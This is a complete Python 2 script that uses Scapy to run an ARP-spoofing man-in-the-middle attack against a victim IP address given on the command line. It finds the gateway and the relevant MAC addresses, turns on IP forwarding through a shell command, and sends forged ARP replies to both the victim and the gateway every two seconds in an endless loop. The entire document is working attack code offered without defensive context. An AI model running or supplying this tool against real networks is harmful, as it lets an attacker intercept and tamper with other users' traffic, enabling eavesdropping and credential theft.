import os
import sys
import time
from scapy.all import *

# get gw ip
def get_gw_addr():
	route = conf.route.routes
	for info in route:
		if info[2] != "0.0.0.0":
			print "gateway : " + info[2]
			return info[2]

# get victim mac
def get_vic_mac():
	pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=sys.argv[1],op=1)
	ans,unans = srp(pkt, timeout=2)
	return ans[0][1]['ARP'].hwsrc

# get gw mac
def get_gw_mac():
	pkt = Ether()/ARP(pdst=get_gw_addr(), op=1)
	ans,unans = srp(pkt)
	return ans[0][1]['ARP'].hwsrc

# get my-pc ip & mac
def get_my_info():
        pkt = Ether()/ARP(pdst=get_gw_addr(), op=1)
        ans,unans = srp(pkt)
	return ans[0][0]['ARP'].psrc, ans[0][0]['ARP'].hwsrc

# send spoofed arp packet to victim & gw
def send_poison(vic_ip,gw_ip,my_mac):
	pkt = Ether()/ARP(pdst=vic_ip, psrc=gw_ip, hwsrc=my_mac, op=1)
	ans,unans = srp(pkt)
	pkt = Ether()/ARP(pdst=gw_ip, psrc=vic_ip, hwsrc=my_mac, op=1)
        ans,unans = srp(pkt)

# set ip_forward enable
def ip_forward():
	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")


gw_ip   = get_gw_addr()
gw_mac  = get_gw_mac()
vic_ip  = sys.argv[1]
vic_mac = get_vic_mac()
my_ip,my_mac = get_my_info()


ip_forward()
while 1:
	send_poison(vic_ip,gw_ip,my_mac)
	time.sleep(2)
